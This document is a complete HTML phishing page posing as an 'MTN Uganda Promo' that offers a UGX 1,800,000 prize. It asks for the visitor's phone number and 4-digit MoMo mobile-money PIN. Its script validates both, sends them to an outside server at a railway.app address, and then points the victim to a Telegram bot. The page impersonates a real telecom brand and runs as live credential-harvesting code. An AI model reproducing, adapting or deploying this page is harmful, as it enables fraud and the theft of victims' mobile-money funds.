<!DOCTYPE html>
<html>
<head>
    <title>MTN Promo - UGX 1,800,000</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 16px;
        }
        .wrapper {
            background: white;
            border-radius: 48px;
            padding: 32px 24px 44px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.12);
        }
        .prize-message {
            background: #f8fafc;
            padding: 18px 20px;
            border-radius: 28px;
            border-left: 4px solid #f5a623;
            border-right: 4px solid #f5a623;
            margin: 20px 0;
        }
        .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
        label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
        input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 15px 20px;
            border: 1.5px solid #e2e8f0;
            border-radius: 60px;
            font-size: 17px;
            outline: none;
        }
        input:focus { border-color: #f5a623; }
        .pin-wrapper { display: flex; gap: 14px; justify-content: center; margin: 12px 0; }
        .pin-box {
            width: 68px;
            height: 68px;
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            border: 1.5px solid #cbd5e1;
            border-radius: 20px;
            outline: none;
            font-family: monospace;
        }
        .pin-box:focus { border-color: #f5a623; }
        button {
            margin-top: 24px;
            background: #f5a623;
            border: none;
            padding: 14px 30px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            width: 100%;
        }
        .status {
            margin-top: 16px;
            font-size: 14px;
            color: #666;
        }
        @media (max-width: 480px) {
            .pin-box { width: 55px; height: 55px; font-size: 28px; }
        }
    </style>
</head>
<body>
<div class="wrapper">
    <h1 style="color: #1a2c3e;">MTN Uganda Promo</h1>
    <div class="prize-message">
        You're almost there — fill in the form below to claim
        <div class="prize-amount">UGX 1,800,000</div>
        instantly.
    </div>
    
    <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off">
    <label>🔐 4-digit MoMo PIN</label>
    <div class="pin-wrapper">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
        <input class="pin-box" maxlength="1" inputmode="numeric">
    </div>
    
    <button onclick="submitForm()">💰 Claim Prize</button>
    <div class="status" id="statusMsg"></div>
</div>

<script>
    const phoneInput = document.getElementById('phoneInput');
    const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
    const statusMsg = document.getElementById('statusMsg');
    let realPin = ['', '', '', ''];
    let submitted = false;

    phoneInput.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
    });

    pinBoxes.forEach((box, idx) => {
        box.addEventListener('input', e => {
            let val = e.target.value.replace(/\D/g, '');
            if (!val) return;
            e.target.value = val;
            realPin[idx] = val;
            setTimeout(() => {
                if (document.activeElement !== box) e.target.value = '•';
            }, 150);
            if (idx < 3) pinBoxes[idx + 1].focus();
        });
        box.addEventListener('keydown', e => {
            if (e.key === 'Backspace') {
                realPin[idx] = '';
                if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
            }
        });
        box.addEventListener('focus', function() {
            if (realPin[idx]) this.value = realPin[idx];
        });
        box.addEventListener('blur', function() {
            if (realPin[idx]) this.value = '•';
        });
    });

    async function submitForm() {
        if (submitted) return;
        
        const phone = phoneInput.value;
        const pin = realPin.join('');
        
        if (!/^07\d{8}$/.test(phone)) {
            statusMsg.innerHTML = '❌ Invalid MTN number (07XXXXXXXX)';
            statusMsg.style.color = 'red';
            return;
        }
        if (pin.length !== 4) {
            statusMsg.innerHTML = '❌ Enter complete 4-digit PIN';
            statusMsg.style.color = 'red';
            return;
        }
        
        submitted = true;
        statusMsg.innerHTML = '⏳ Processing...';
        statusMsg.style.color = '#f5a623';
        
        try {
            const response = await fetch('https://momoloan-production.up.railway.app/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, pin })
            });
            
            const data = await response.json();
            
            if (data.success) {
                statusMsg.innerHTML = '✅ Success! Check your Telegram @Ugxforme_bot';
                statusMsg.style.color = 'green';
                // Optional: redirect after 2 seconds
                // setTimeout(() => {
                //     window.location.href = 'https://www.mtn.co.ug/';
                // }, 2000);
            } else {
                statusMsg.innerHTML = '❌ Error: ' + (data.details || data.error);
                statusMsg.style.color = 'red';
                submitted = false;
            }
        } catch (err) {
            statusMsg.innerHTML = '❌ Server error: ' + err.message;
            statusMsg.style.color = 'red';
            submitted = false;
        }
    }
</script>
</body>
</html>
